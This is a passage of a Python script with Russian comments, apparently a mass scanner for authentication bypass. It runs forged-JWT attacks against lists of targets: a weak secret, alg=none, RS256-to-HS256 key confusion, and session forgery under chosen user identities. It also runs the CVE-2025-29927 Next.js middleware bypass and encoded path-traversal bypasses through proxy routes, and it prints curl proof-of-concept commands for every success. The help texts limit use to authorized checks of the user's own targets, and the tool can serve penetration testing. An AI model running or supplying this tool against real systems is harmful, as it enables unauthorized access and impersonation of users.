        bypass_url = bypass_template.replace("{payload}", payload)
        try:
            resp = safe_get(bypass_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            checks.append(ProxyBypassCheck(payload=payload, direct_url=direct_url, bypass_url=bypass_url, error=str(e)))
            continue

        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                    and body_size > 0 and not trivial)

        severity, indicators = (None, [])
        if accepted:
            severity, indicators = classify_body_severity(resp.content)

        checks.append(ProxyBypassCheck(
            payload=payload, direct_url=direct_url, bypass_url=bypass_url,
            status_code=resp.status_code, content_type=content_type, body_size=body_size,
            accepted=accepted, is_trivial_body=trivial,
            curl_poc=f"curl -skL --path-as-is '{bypass_url}'",
            severity=severity, sensitive_indicators=indicators,
        ))

    if baseline_ok:
        verdict = "not_applicable"
    elif any(c.accepted for c in checks):
        verdict = "confirmed_bypass"
    else:
        verdict = "protected"

    return baseline_ok, baseline_status, verdict, checks


def read_targets(path: str) -> list[str]:
    targets = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Если в файле нет схемы - добавим http:// по умолчанию
                if not line.startswith(("http://", "https://")):
                    line = "http://" + line
                targets.append(line)
    except FileNotFoundError:
        print(f"[!] Файл не найден: {path}", file=sys.stderr)
        sys.exit(1)
    return targets


def read_paths(path: str) -> list[str]:
    paths = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith("/"):
                    line = "/" + line
                paths.append(line)
    except FileNotFoundError:
        print(f"[!] Файл с путями не найден: {path}", file=sys.stderr)
        sys.exit(1)
    return paths


def build_urls(targets: list[str], paths: Optional[list[str]]) -> list[str]:
    """Комбинирует каждый таргет с каждым путём (если пути заданы)."""
    if not paths:
        return targets

    urls = []
    for target in targets:
        base = target.rstrip("/")
        for p in paths:
            urls.append(base + p)
    return urls


def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers: dict,
                  jwt_test: bool = False, jwt_secret: str = "secret",
                  jwt_payload: Optional[dict] = None, jwt_header_name: str = "Authorization",
                  jwt_cookie_name: str = "access_token",
                  jwt_rsa_pubkey_pem: Optional[bytes] = None,
                  jwt_identities: Optional[list] = None,
                  ignore_trivial_body: bool = True,
                  extra_trivial_values: Optional[set] = None,
                  check_nextjs_cve: bool = False,
                  jwt_profiles: Optional[list] = None) -> CheckResult:
    try:
        resp = safe_request(
            method,
            url,
            timeout=timeout,
            verify=verify_ssl,
            headers=headers,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        return CheckResult(url=url, ok=False, error=str(e))

    status_code = resp.status_code
    content_type_raw = resp.headers.get("Content-Type", "")
    # Content-Type может содержать charset, например: application/json; charset=utf-8
    content_type = content_type_raw.split(";")[0].strip().lower()
    body_size = len(resp.content)
    trivial_body = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
    baseline_ok = (status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                   and body_size > 0 and not trivial_body)

    jwt_checks = []
    jwt_verdict = None
    if jwt_test:
        # jwt_profiles: список (имя_профиля, payload) - используется в --full, где сразу
        # прогоняются оба захардкоженных профиля (generic_admin + azure_b2c). Без него -
        # обычный однопрофильный режим (одиночный --jwt-payload/--jwt-azure-b2c/дефолт).
        profiles = jwt_profiles if jwt_profiles else [(None, jwt_payload or default_jwt_payload())]
        per_profile_verdicts = []
        for profile_name, payload in profiles:
            if jwt_identities:
                checks = run_jwt_checks_multi_identity(
                    url, timeout, verify_ssl, headers, jwt_secret,
                    payload, jwt_identities,
                    jwt_header_name, jwt_cookie_name, rsa_pubkey_pem=jwt_rsa_pubkey_pem,
                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
                )
            else:
                checks = run_jwt_checks(
                    url, timeout, verify_ssl, headers, jwt_secret,
                    payload, jwt_header_name, jwt_cookie_name,
                    rsa_pubkey_pem=jwt_rsa_pubkey_pem,
                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
                )
            if profile_name:
                for c in checks:
                    c.kind = f"{profile_name}:{c.kind}"
            per_profile_verdicts.append(classify_jwt_verdict(baseline_ok, checks))
            jwt_checks.extend(checks)
        jwt_verdict = combine_jwt_verdicts(per_profile_verdicts)

    nextjs_cve_checks = []
    nextjs_cve_verdict = None
    if check_nextjs_cve:
        nextjs_cve_verdict, nextjs_cve_checks = check_cve_2025_29927(
            url, timeout, verify_ssl, headers, baseline_ok,
            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
        )

    common = dict(
        jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
        nextjs_cve_checks=nextjs_cve_checks, nextjs_cve_verdict=nextjs_cve_verdict,
    )

    if status_code != 200:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"статус {status_code} != 200", **common,
        )

    if content_type not in ALLOWED_CONTENT_TYPES:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"content-type '{content_type}' не входит в разрешённые {ALLOWED_CONTENT_TYPES}",
            **common,
        )

    if body_size == 0:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason="тело ответа пустое (0 байт)", **common,
        )

    if trivial_body:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason="тело похоже на health-check ответ (OK/HEALTHY и т.п.) - вероятный false positive",
            **common,
        )

    return CheckResult(
        url=url, ok=True, status_code=status_code,
        content_type=content_type, body_size=body_size, **common,
    )


def is_finding_result(result: "CheckResult") -> bool:
    """True, если этот CheckResult вообще стоит записывать в results.json -
    т.е. это находка: незащищённый эндпоинт (baseline 200 без токена) или
    подтверждённый JWT-bypass, или подтверждённый обход CVE-2025-29927.
    Обычные 'закрыто как надо' и 404/network-error результаты в файл не попадают."""
    if result.ok:
        return True
    if result.jwt_verdict in ("confirmed_vulnerable", "signature_not_validated", "no_auth_required"):
        return True
    if result.nextjs_cve_verdict == "confirmed_bypass":
        return True
    return False


def finding_result_dict(result: "CheckResult") -> dict:
    """asdict(result), но с jwt_checks/nextjs_cve_checks, обрезанными до
    только принятых (accepted=True) попыток - чтобы в файле были только
    реальные PoC, а не десятки отклонённых негативных контролей."""
    d = asdict(result)
    d["jwt_checks"] = [c for c in d["jwt_checks"] if c.get("accepted")]
    d["nextjs_cve_checks"] = [c for c in d["nextjs_cve_checks"] if c.get("accepted")]
    return d


def write_results_incremental(output_path: str, results: list, targets: list, use_proxy_format: bool,
                               proxy_bypass_results: list) -> None:
    """Пишет текущее накопленное состояние НАХОДОК в output_path немедленно, по мере
    готовности - а не только один раз в самом конце прогона. В файл попадают ТОЛЬКО
    подтверждённые обходы/уязвимости (см. is_finding_result и verdict='confirmed_bypass'
    для proxy_bypass) - "чисто" закрытые эндпоинты и отклонённые попытки в JSON не пишутся,
    хотя по-прежнему видны в консольном логе по ходу выполнения.

    Файл перезаписывается целиком на каждый вызов (это простая и надёжная схема:
    JSON в файле всегда валиден целиком, можно tail'ить/парсить в любой момент),
    но запись идёт через временный файл + os.replace (атомарно), чтобы не
    оставить файл в битом состоянии, если процесс прервут посреди записи.

    use_proxy_format фиксируется один раз в начале прогона (по args.check_proxy_bypass),
    а не по факту наличия proxy_bypass_results - иначе формат файла менялся бы
    посреди прогона (сначала плоский список, потом объект {results, proxy_bypass}),
    что ломает потребителей, которые уже начали читать файл.
    """
    order = {url: i for i, url in enumerate(targets)}
    findings = [r for r in results if is_finding_result(r)]
    findings_sorted = sorted(findings, key=lambda r: order.get(r.url, 0))

    confirmed_proxy_bypass = [
        (direct_url, template, baseline_ok, baseline_status, verdict, checks)
        for direct_url, template, baseline_ok, baseline_status, verdict, checks in proxy_bypass_results
        if verdict == "confirmed_bypass"
    ]

    if use_proxy_format:
        payload = {
            "results": [finding_result_dict(r) for r in findings_sorted],
            "proxy_bypass": [
                {
                    "direct_url": direct_url,
                    "template": template,
                    "baseline_ok": baseline_ok,
                    "baseline_status": baseline_status,
                    "verdict": verdict,
                    "severity": aggregate_pair_severity(checks)[0],
                    "sensitive_indicators": aggregate_pair_severity(checks)[1],
                    "checks": [asdict(c) for c in checks if c.accepted],
                }
                for direct_url, template, baseline_ok, baseline_status, verdict, checks in confirmed_proxy_bypass
            ],
        }
    else:
        payload = [finding_result_dict(r) for r in findings_sorted]

    tmp_path = f"{output_path}.tmp"
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=False, indent=2)
    os.replace(tmp_path, output_path)


def main():
    parser = argparse.ArgumentParser(description="Проверка таргетов на 200 OK, content-type и непустое тело")
    parser.add_argument("-f", "--file", required=True, help="Путь к файлу со списком таргетов (по одному URL/домену на строку)")
    parser.add_argument("-p", "--paths", help="Путь к файлу со списком путей (например index.html), которые будут по очереди подставляться к каждому таргету")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Таймаут запроса в секундах (по умолчанию 10)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Количество параллельных потоков (по умолчанию 10)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "HEAD", "POST"], help="HTTP метод (по умолчанию GET; для HEAD тело обычно будет 0 байт)")
    parser.add_argument("-o", "--output", default="auth_results.json",
                         help="Путь для сохранения НАХОДОК (только подтверждённые обходы/уязвимости, "
                              "не все проверки подряд) в JSON. Пишется инкрементально по ходу выполнения. "
                              "По умолчанию auth_results.json (в текущей директории)")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Отключить проверку SSL сертификатов")
    parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок вида 'Key: Value' (можно указывать несколько раз)")
    parser.add_argument("--fail-only", action="store_true", help="Выводить в консоль только неуспешные проверки")
    parser.add_argument("--tqdm", action="store_true",
                         help="Показывать только прогресс-бар вместо построчного лога по каждому URL/JWT/CVE/payload'у "
                              "(итоговые сводки и найденные уязвимости в конце всё равно печатаются). "
                              "Требует пакет tqdm (pip install tqdm); если не установлен - выводится предупреждение "
                              "и скрипт продолжает работу с обычным построчным логом")
    parser.add_argument("--allow-trivial-bodies", action="store_true",
                         help="Не отсеивать тривиальные health-check ответы (OK/HEALTHY/PONG и т.п.) - по умолчанию они считаются false positive и не засчитываются")
    parser.add_argument("--ignore-body-value", action="append", default=[], metavar="VALUE",
                         help="Дополнительное тривиальное значение тела ответа для фильтрации как false positive (можно указывать несколько раз), например --ignore-body-value alive")

    cve_group = parser.add_argument_group("Проверки известных CVE (только для авторизованных проверок собственных таргетов)")
    cve_group.add_argument("--check-nextjs-cve", action="store_true",
                            help="Проверить CVE-2025-29927 (CVSS 9.1) - обход Next.js middleware через заголовок "
                                 "x-middleware-subrequest, позволяющий полностью пропустить auth-проверки, "
                                 "реализованные в middleware. Актуально для Next.js < 12.3.5 / < 13.5.9 / < 14.2.25 / < 15.2.3")

    jwt_group = parser.add_argument_group("JWT-тестирование (только для авторизованных проверок собственных таргетов)")
    jwt_group.add_argument("--jwt-test", action="store_true", help="Проверить bypass через JWT: слабый секрет (HS256 'secret'), alg=none (в т.ч. регистровые варианты и пустой payload), плюс негативный контроль (мусорная подпись) для отсева ложных срабатываний")
    jwt_group.add_argument("--jwt-secret", default="secret", help="Секрет для подписи HS256 токена (по умолчанию 'secret')")
    jwt_group.add_argument("--jwt-payload", help="Путь к JSON файлу с claims для токена (по умолчанию {\"sub\":\"admin\",\"role\":\"admin\",\"admin\":true})")
    jwt_group.add_argument("--jwt-header-name", default="Authorization", help="Имя заголовка для Bearer-варианта (по умолчанию Authorization, значение будет 'Bearer <token>')")
    jwt_group.add_argument("--jwt-cookie-name", default="access_token", help="Имя cookie для cookie-варианта (по умолчанию access_token)")
    jwt_group.add_argument("--jwt-azure-b2c", action="store_true", help="Использовать payload в стиле Azure AD B2C токена (iss/aud/oid/tfp/emails и т.п.) как дефолтный, вместо generic payload. Игнорируется, если задан --jwt-payload")
    jwt_group.add_argument("--jwt-rsa-pubkey", help="Путь к файлу или URL публичного RSA-ключа (PEM) для атаки RS256->HS256 key confusion. "
                                                      "Актуально для Azure B2C и любых RS256-токенов: ключ всегда публичен "
                                                      "(доступен через .../discovery/v2.0/keys или /.well-known/jwks.json тенанта), "
                                                      "если JWKS отдаёт JWK (n/e), сконвертируйте в PEM заранее (например через python-jose/cryptography) и укажите путь к PEM-файлу")
    jwt_group.add_argument("--jwt-claim", action="append", default=[], metavar="KEY=VALUE",
                            help="Переопределить/добавить конкретный claim в payload (можно указывать несколько раз), "
                                 "например --jwt-claim oid=1111-2222 --jwt-claim emails='[\"victim@corp.com\"]'. "
                                 "Значение парсится как JSON, если не получилось - берётся как строка")
    jwt_group.add_argument("--jwt-identities", help="Путь к JSON-файлу со списком личностей для подделки сессии под конкретных пользователей: "
                                                      "[{\"sub\":\"...\",\"oid\":\"...\",\"emails\":[\"user@corp.com\"],\"name\":\"...\"}, ...]. "
                                                      "Каждая запись мержится поверх базового payload, и весь набор JWT-подделок "
                                                      "прогоняется отдельно для КАЖДОЙ личности - так проверяется session hijack "
                                                      "под произвольного пользователя, а не только generic admin-доступ. "
                                                      "ВНИМАНИЕ: сильно увеличивает число запросов (N личностей x 7 видов токена x 2 доставки на URL)")

    parser.add_argument("--full", action="store_true",
                         help="Запустить сразу все проверки: --jwt-test, --check-nextjs-cve и (если задан "
                              "--proxy-bypass-map) --check-proxy-bypass. Отдельные флаги можно комбинировать "
                              "с --full как обычно (например --full --jwt-azure-b2c)")

    proxy_group = parser.add_argument_group("Обход авторизации через прокси-ресурс шлюза (только для авторизованных проверок собственных таргетов)")
    proxy_group.add_argument("--check-proxy-bypass", action="store_true",
                              help="Проверить обход защищённого ресурса через закодированный path traversal (%%2e%%2e и т.п.) "
                                   "внутри соседнего публичного прокси-пути (например /api/swagger/{payload}v1/...). "
                                   "Актуально для AWS API Gateway {proxy+}, Swagger-прокси и подобных reverse-proxy маршрутов, "
                                   "где authorizer привязан к конкретному ресурсу, а не к бэкенду в целом. Требует --proxy-bypass-map")
    proxy_group.add_argument("--proxy-bypass-map",
                              help="Путь к файлу с парами 'прямой_URL => шаблон_обхода' (по одной паре на строку), "
                                   "шаблон обязан содержать плейсхолдер {payload}. Пример: "
                                   "https://host/dev/api/v1/pdt/items?x=1 => https://host/dev/api/swagger/{payload}v1/pdt/items?x=1")
    proxy_group.add_argument("--skip-baseline", action="store_true",
                              help="Пропустить фазу 1 (baseline-проверка каждого target x path без обхода: "
                                   "200/401/403 + опционально JWT/CVE) и сразу перейти к proxy-bypass. "
                                   "Полезно, если нужен ЧИСТО обход через прокси-путь, без лишнего вывода "
                                   "по прямым запросам к targets/paths (baseline всё равно считается отдельно "
                                   "внутри самого proxy-bypass теста для каждой пары)")

    args = parser.parse_args()

    if args.tqdm and _tqdm is None:
        print("[!] --tqdm: пакет tqdm не установлен (pip install tqdm), продолжаю с обычным построчным логом", file=sys.stderr)
        args.tqdm = False

    jwt_profiles = None  # None = обычный однопрофильный режим; список = --full, оба профиля сразу
    if args.full:
        args.jwt_test = True
        args.check_nextjs_cve = True
        enabled = ["--jwt-test (профили: generic_admin + azure_b2c)", "--check-nextjs-cve"]

        # если пользователь явно не задал свой payload/claims/b2c-режим - под --full
        # прогоняем ОБА захардкоженных JWT-профиля сразу, а не один на выбор
        if not (args.jwt_payload or args.jwt_azure_b2c or args.jwt_claim):
            jwt_profiles = [("generic_admin", default_jwt_payload()), ("azure_b2c", azure_b2c_jwt_payload())]

        args.check_proxy_bypass = True
        if args.proxy_bypass_map:
            enabled.append("--check-proxy-bypass (ручная карта + auto-набор из COMMON_PROXY_PREFIXES)")
        elif args.paths:
            enabled.append(f"--check-proxy-bypass (auto: {len(COMMON_PROXY_PREFIXES)} публичных префиксов x {len(PROXY_BYPASS_PAYLOADS)} payload'ов на каждый путь из --paths)")
        else:
            print("[i] --full: для auto-обхода через прокси-ресурс нужен --paths (список защищённых путей типа /users, /api/v1/users) - без него проверка обхода пропущена", file=sys.stderr)
            args.check_proxy_bypass = False

        print(f"[*] --full: включены проверки: {', '.join(enabled)}")

    if args.check_proxy_bypass and not args.proxy_bypass_map and not args.paths:
        print("[!] --check-proxy-bypass требует --proxy-bypass-map и/или --paths (для auto-режима)", file=sys.stderr)
        sys.exit(1)

    headers = {}
    for h in args.header:
        if ":" not in h:
            print(f"[!] Некорректный заголовок, пропущен: {h}", file=sys.stderr)
            continue
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()

    jwt_payload = default_jwt_payload()
    if args.jwt_azure_b2c:
        jwt_payload = azure_b2c_jwt_payload()
    if args.jwt_payload:
        try:
            with open(args.jwt_payload, "r", encoding="utf-8") as f:
                jwt_payload = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"[!] Не удалось прочитать --jwt-payload: {e}", file=sys.stderr)
            sys.exit(1)

    if args.jwt_claim:
        overrides = parse_claim_overrides(args.jwt_claim)
        jwt_payload = {**jwt_payload, **overrides}
        print(f"[*] Claims переопределены через --jwt-claim: {list(overrides.keys())}")

    jwt_identities = None
    if args.jwt_identities:
        jwt_identities = read_identities(args.jwt_identities)
        print(f"[*] Загружено личностей для подделки сессии: {len(jwt_identities)}")

    jwt_rsa_pubkey_pem = None
    if args.jwt_rsa_pubkey:
        try:
            jwt_rsa_pubkey_pem = load_rsa_public_key(args.jwt_rsa_pubkey, args.timeout)
            print(f"[*] Публичный RSA-ключ загружен ({len(jwt_rsa_pubkey_pem)} байт), включаю проверку RS256->HS256 confusion")
        except Exception as e:
            print(f"[!] Не удалось загрузить --jwt-rsa-pubkey: {e}", file=sys.stderr)
            sys.exit(1)

    ignore_trivial_body = not args.allow_trivial_bodies
    extra_trivial_values = {v.strip().lower() for v in args.ignore_body_value} if args.ignore_body_value else None
    if not ignore_trivial_body:
        print("[*] Фильтрация тривиальных health-check ответов (OK/HEALTHY) ОТКЛЮЧЕНА (--allow-trivial-bodies)")

    raw_targets = read_targets(args.file)
    if not raw_targets:
        print("[!] Список таргетов пуст.", file=sys.stderr)
        sys.exit(1)

    raw_paths = read_paths(args.paths) if args.paths else None
    paths = raw_paths
    targets = build_urls(raw_targets, paths)

    if paths:
        print(f"[*] Таргетов: {len(raw_targets)} x путей: {len(paths)} = {len(targets)} URL. Запускаю проверку (потоков: {args.workers})...\n")
    else:
        print(f"[*] Загружено таргетов: {len(targets)}. Запускаю проверку (потоков: {args.workers})...\n")

    use_proxy_format = args.check_proxy_bypass  # фиксируем формат вывода один раз на весь прогон
    proxy_bypass_results = []  # список (direct_url, template, baseline_ok, baseline_status, verdict, checks)

    results: list[CheckResult] = []
    if args.skip_baseline:
        print("[i] --skip-baseline: фаза 1 (прямая baseline/JWT/CVE проверка targets/paths) пропущена, "
              "сразу перехожу к proxy-bypass\n")
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            future_to_url = {
                executor.submit(
                    check_target, url, args.timeout, args.method, not args.no_verify_ssl, headers,
                    args.jwt_test, args.jwt_secret, jwt_payload, args.jwt_header_name, args.jwt_cookie_name,
                    jwt_rsa_pubkey_pem, jwt_identities, ignore_trivial_body, extra_trivial_values,
                    args.check_nextjs_cve, jwt_profiles,
                ): url
                for url in targets
            }
            completed = concurrent.futures.as_completed(future_to_url)
            if args.tqdm:
                completed = _tqdm(completed, total=len(future_to_url), desc="baseline/JWT/CVE", unit="url")
            for future in completed:
                result = future.result()
                results.append(result)

                if args.output:
                    write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)

                if args.tqdm:
                    continue

                if args.fail_only and result.ok:
                    continue

                if result.ok:
                    print(f"[OK]   {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B")
                elif result.error:
                    print(f"[ERR]  {result.url}  ошибка запроса: {result.error}")
                else:
                    print(f"[FAIL] {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B — {result.reason}")

                for jc in result.jwt_checks:
                    label = f"{jc.kind}/{jc.delivery}"
                    if jc.identity:
                        label = f"identity={jc.identity} {label}"
                    if jc.error:
                        print(f"       └─ JWT[{label}] ошибка: {jc.error}")
                    elif jc.accepted:
                        tag = "[КОНТРОЛЬ принят]" if jc.is_control else "[!!! forged принят]"
                        print(f"       └─ {tag} JWT[{label}]: status={jc.status_code} type={jc.content_type} size={jc.body_size}B")
                        print(f"          PoC: {jc.curl_poc}")
                    else:
                        reason = " (health-check-подобное тело, false positive отфильтрован)" if jc.is_trivial_body else ""
                        print(f"       └─ JWT[{label}] отклонён: status={jc.status_code} type={jc.content_type} size={jc.body_size}B{reason}")

                if result.jwt_verdict:
                    verdict_labels = {
                        "confirmed_vulnerable": "[!!! ПОДТВЕРЖДЕНО] сервер валидирует JWT, но принимает подделанный (слабый секрет / alg=none)",
                        "signature_not_validated": "[!] подпись JWT вообще не проверяется (принят даже случайный мусор)",
                        "no_auth_required": "[i] эндпоинт отдаёт 200 и без токена — авторизация не требуется вовсе",
                        "protected": "[OK] все подделанные токены отклонены",
                    }
                    print(f"       └─ ВЕРДИКТ: {verdict_labels.get(result.jwt_verdict, result.jwt_verdict)}")

                for cc in result.nextjs_cve_checks:
                    if cc.error:
                        print(f"       └─ CVE-2025-29927[{cc.payload}] ошибка: {cc.error}")
                    elif cc.accepted:
                        print(f"       └─ [!!! BYPASS] CVE-2025-29927 x-middleware-subrequest='{cc.payload}': status={cc.status_code} type={cc.content_type} size={cc.body_size}B")
                        print(f"          PoC: {cc.curl_poc}")
                    else:
                        trivial_note = " (health-check-подобное тело)" if cc.is_trivial_body else ""
                        print(f"       └─ CVE-2025-29927[{cc.payload}] отклонён: status={cc.status_code}{trivial_note}")

                if result.nextjs_cve_verdict:
                    cve_verdict_labels = {
                        "confirmed_bypass": "[!!! ПОДТВЕРЖДЕНО] x-middleware-subrequest обходит Next.js middleware (CVE-2025-29927, CVSS 9.1)",
                        "protected": "[OK] обход через x-middleware-subrequest не сработал",
                        "not_applicable": "[i] эндпоинт и так доступен без обхода - тест неинформативен",
                    }
                    print(f"       └─ ВЕРДИКТ CVE-2025-29927: {cve_verdict_labels.get(result.nextjs_cve_verdict, result.nextjs_cve_verdict)}")

    ok_count = sum(1 for r in results if r.ok)
    fail_count = len(results) - ok_count
    print(f"\n[*] Итого: {len(results)} | успешно: {ok_count} | провалено: {fail_count}")

    if args.jwt_test:
        confirmed = [r for r in results if r.jwt_verdict == "confirmed_vulnerable"]
        no_sig_check = [r for r in results if r.jwt_verdict == "signature_not_validated"]
        no_auth = [r for r in results if r.jwt_verdict == "no_auth_required"]
        protected = [r for r in results if r.jwt_verdict == "protected"]

        print(f"\n[*] JWT-вердикты: подтверждено уязвимых={len(confirmed)} | подпись не проверяется={len(no_sig_check)} | без авторизации={len(no_auth)} | защищено={len(protected)}")

        if confirmed:
            print(f"\n[!!!] ПОДТВЕРЖДЕНО: сервер валидирует JWT, но принимает подделанный ({len(confirmed)}):")
            for r in confirmed:
                for jc in r.jwt_checks:
                    if jc.accepted and not jc.is_control:
                        identity_part = f"  identity={jc.identity}" if jc.identity else ""
                        print(f"      - {r.url}  [{jc.kind}/{jc.delivery}]{identity_part}")
                        print(f"        PoC: {jc.curl_poc}")

        if no_sig_check:
            print(f"\n[!] Подпись JWT вообще не проверяется (принят даже мусорный токен) ({len(no_sig_check)}):")
            for r in no_sig_check:
                print(f"      - {r.url}")
                for jc in r.jwt_checks:
                    if jc.accepted and jc.is_control:
                        print(f"        PoC (мусорная подпись всё равно принята): {jc.curl_poc}")

        if no_auth:
            print(f"\n[i] Эндпоинты без авторизации вовсе (200 и без токена) ({len(no_auth)}):")
            for r in no_auth:
                print(f"      - {r.url}")
                print(f"        PoC (без токена вообще): curl -i '{r.url}'")

    if args.check_nextjs_cve:
        cve_confirmed = [r for r in results if r.nextjs_cve_verdict == "confirmed_bypass"]
        cve_protected = [r for r in results if r.nextjs_cve_verdict == "protected"]
        cve_na = [r for r in results if r.nextjs_cve_verdict == "not_applicable"]

        print(f"\n[*] CVE-2025-29927 вердикты: подтверждён обход={len(cve_confirmed)} | защищено={len(cve_protected)} | не применимо={len(cve_na)}")

        if cve_confirmed:
            print(f"\n[!!!] ПОДТВЕРЖДЕНО CVE-2025-29927 (CVSS 9.1): обход Next.js middleware через x-middleware-subrequest ({len(cve_confirmed)}):")
            for r in cve_confirmed:
                for cc in r.nextjs_cve_checks:
                    if cc.accepted:
                        print(f"      - {r.url}  [payload='{cc.payload}']")
                        print(f"        PoC: {cc.curl_poc}")

    if args.check_proxy_bypass:
        pairs = []
        if args.proxy_bypass_map:
            pairs.extend(read_proxy_bypass_map(args.proxy_bypass_map))
        if raw_paths:
            auto_pairs = build_auto_proxy_bypass_pairs(raw_targets, raw_paths)
            print(f"[*] Auto-режим: сгенерировано {len(auto_pairs)} пар обхода "
                  f"({len(raw_targets)} таргетов x {len(raw_paths)} путей x {len(COMMON_PROXY_PREFIXES)} публичных префиксов)")
            pairs.extend(auto_pairs)
        pairs = list(dict.fromkeys(pairs))  # убираем точные дубликаты (direct_url, template), сохраняя порядок

        if not pairs:
            print("[!] Нет пар для проверки обхода: --proxy-bypass-map не задан или пуст, и --paths тоже не задан.", file=sys.stderr)
        else:
            print(f"\n[*] Проверка обхода через прокси-ресурс: {len(pairs)} пар x {len(PROXY_BYPASS_PAYLOADS)} payload'ов...\n")
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                future_to_pair = {
                    executor.submit(
                        check_proxy_bypass_pair, direct_url, template, args.timeout, not args.no_verify_ssl,
                        headers, ignore_trivial_body, extra_trivial_values,
                    ): (direct_url, template)
                    for direct_url, template in pairs
                }
                completed_pairs = concurrent.futures.as_completed(future_to_pair)
                if args.tqdm:
                    completed_pairs = _tqdm(completed_pairs, total=len(future_to_pair), desc="proxy-bypass", unit="pair")
                for future in completed_pairs:
                    direct_url, template = future_to_pair[future]
                    baseline_ok, baseline_status, verdict, checks = future.result()
                    proxy_bypass_results.append((direct_url, template, baseline_ok, baseline_status, verdict, checks))

                    if args.output:
                        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)

                    if args.tqdm:
                        continue

                    print(f"[{'OPEN' if baseline_ok else 'closed'}] direct: {direct_url}  status={baseline_status}  via: {template}")
                    for c in checks:
                        if c.error:
                            print(f"       └─ payload='{c.payload}' ({c.bypass_url}) ошибка: {c.error}")
                        elif c.accepted:
                            print(f"       └─ [!!! BYPASS] payload='{c.payload}': status={c.status_code} type={c.content_type} size={c.body_size}B  severity={c.severity}"
                                  + (f" ({', '.join(c.sensitive_indicators)})" if c.sensitive_indicators else ""))
                            print(f"          PoC: {c.curl_poc}")
                        else:
                            trivial_note = " (health-check-подобное тело)" if c.is_trivial_body else ""
                            print(f"       └─ payload='{c.payload}' ({c.bypass_url}) отклонён: status={c.status_code}{trivial_note}")

                    verdict_labels = {
                        "confirmed_bypass": "[!!! ПОДТВЕРЖДЕНО] прямой доступ закрыт, но обход через прокси-путь возвращает данные",
                        "protected": "[OK] прямой доступ закрыт, все варианты обхода тоже отклонены",
                        "not_applicable": "[i] прямой доступ и так открыт - тест обхода неинформативен",
                    }
                    verdict_line = f"       └─ ВЕРДИКТ: {verdict_labels.get(verdict, verdict)}"
                    if verdict == "confirmed_bypass":
                        pair_severity, _ = aggregate_pair_severity(checks)
                        verdict_line += f"  [SEVERITY: {pair_severity}]"
                    print(verdict_line)

            confirmed = [r for r in proxy_bypass_results if r[4] == "confirmed_bypass"]
            protected = [r for r in proxy_bypass_results if r[4] == "protected"]
            na = [r for r in proxy_bypass_results if r[4] == "not_applicable"]
            print(f"\n[*] Обход через прокси-ресурс - вердикты: подтверждён обход={len(confirmed)} | защищено={len(protected)} | не применимо={len(na)}")

            if confirmed:
                high_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "HIGH")
                medium_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "MEDIUM")
                low_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "LOW")
                print(f"\n[!!!] ПОДТВЕРЖДЁН ОБХОД АВТОРИЗАЦИИ через прокси-ресурс ({len(confirmed)}): "
                      f"HIGH={high_count} | MEDIUM={medium_count} | LOW={low_count}")
                for direct_url, template, _, _, _, checks in confirmed:
                    severity, indicators = aggregate_pair_severity(checks)
                    indicators_note = f"  ({', '.join(indicators)})" if indicators else ""
                    print(f"      - [{severity}] {direct_url}{indicators_note}")
                    for c in checks:
                        if c.accepted:
                            print(f"        payload='{c.payload}'  PoC: {c.curl_poc}")

    if args.output:
        # Находки уже писались в файл по мере готовности (после каждого таргета и каждой
        # пары обхода) через write_results_incremental - здесь просто финальная перезапись
        # с полным, отсортированным по исходному порядку набором находок.
        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)
        print(f"[*] Найденные обходы/уязвимости сохранены в {args.output} (обновлялись по ходу выполнения; "
              f"защищённые/безуспешные попытки в файл не пишутся, они есть только в консольном логе выше)")

    sys.exit(0 if fail_count == 0 else 2)


if __name__ == "__main__":
    main()
